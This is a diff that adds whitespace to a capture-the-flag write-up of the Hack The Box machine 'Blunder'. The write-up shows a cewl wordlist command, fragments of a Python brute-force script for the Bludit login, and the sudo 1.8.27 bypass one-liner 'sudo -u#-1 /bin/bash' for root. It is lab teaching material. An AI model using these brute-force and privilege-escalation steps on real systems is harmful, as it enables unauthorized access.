@@ -18,6 +18,7 @@ tags: [ bruteforce, cewl, sudo ]
 # HTB - Blunder
 
 ![](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/blunder/intro.png)
+
 Blunder is a linux box rate as easy. We need to obtain credential of Bludit v3.9.2 by bruteforce login in order to get a shell. Then, enumerate Bludit files to get user password to switch user into hugo. From there, we could abuse sudo vulnerability to gain root shell.
 
 ---
@@ -83,6 +84,7 @@ Blunder is a linux box rate as easy. We need to obtain credential of Bludit v3.9
 
 - Below is my modified version to fetch wordlist via cewl from the web base.
 - Modify the `host, login_url, username` and fetch `password` from wordlist .
+
 --- 
 ```py
 #!/usr/bin/env python3
@@ -129,9 +131,13 @@ for password in wordlist:
             print()
             break
 ```
+
 ---
+
 - We need a wordlist to attack the bludit login page. Create with `cewl`.
+
 ---
+
 ```bash
     $ cewl -d 4 -m 8 -w wordlist.txt http://10.10.10.191/ 
     CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
@@ -220,7 +226,9 @@ for password in wordlist:
     typically
     Remember
 ```
+
 ---
+
 ## Exploit
 
 - Run the python script and we get the credential!!
@@ -264,13 +272,16 @@ for password in wordlist:
 ![picture3](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/blunder/12.png)
 
 ---
+
 ## PrivEsc
 
 - As usual, with `sudo -l` and we have `(ALL, !root) /bin/bash` .
 
 ![picture3](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/blunder/13.png)
+
 - Google-Fu and we find this [exploit](https://www.exploit-db.com/exploits/47502)  for  `sudo 1.8.27 - Security Bypass`. 
 - So user `hugo` can't run `/bin/bash as root (!root)`.
+
 ```bash
 # User privilege specification
 root    ALL=(ALL:ALL) ALL
@@ -280,7 +291,9 @@ With ALL specified, user hugo can run the binary /bin/bash as any user
 EXPLOIT: 
 
 sudo -u#-1 /bin/bash
+
 ```
+
 ![picture3](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/blunder/14.png)
 
 Thanks...
